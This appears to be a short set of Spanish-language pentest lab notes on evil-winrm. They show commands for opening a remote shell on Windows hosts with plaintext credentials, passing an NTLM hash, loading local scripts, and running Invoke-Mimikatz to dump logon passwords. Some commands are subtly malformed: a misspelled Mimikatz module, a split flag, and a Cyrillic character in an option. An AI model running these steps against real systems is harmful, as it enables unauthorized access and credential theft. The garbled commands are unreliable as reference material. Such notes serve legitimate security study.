es una herramienta (script) que nos permite obtener una shell haciendo uso de WinRM ([[Exploiting WinRM]])

---

```bash
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.29.206
```
![[Pasted image 20231214221842.png]]
	si le pasamao el parametro `-H` podemos pasarle el hash NTLM

nosotros podemos cargar una carpeta cuando estabmos estableciendo una conexion, es decir podemos hacer uso de herramientas de nuestro equipo 
```bash
evil-winrm. rb -u administrator -р 'rocknroll_123321' -i 10.4.24.110 - s /root/Desktop/tools/scripts/
```
![[Pasted image 20250215125108.png]]
ya lo tenemos
![[Pasted image 20250215125146.png]]
podemos usar el modulo [[mimikatz]]
![[Pasted image 20250215125221.png]]
```bash
invoke-mimikatz -Command 'sedkurlsa::logonpass'
```

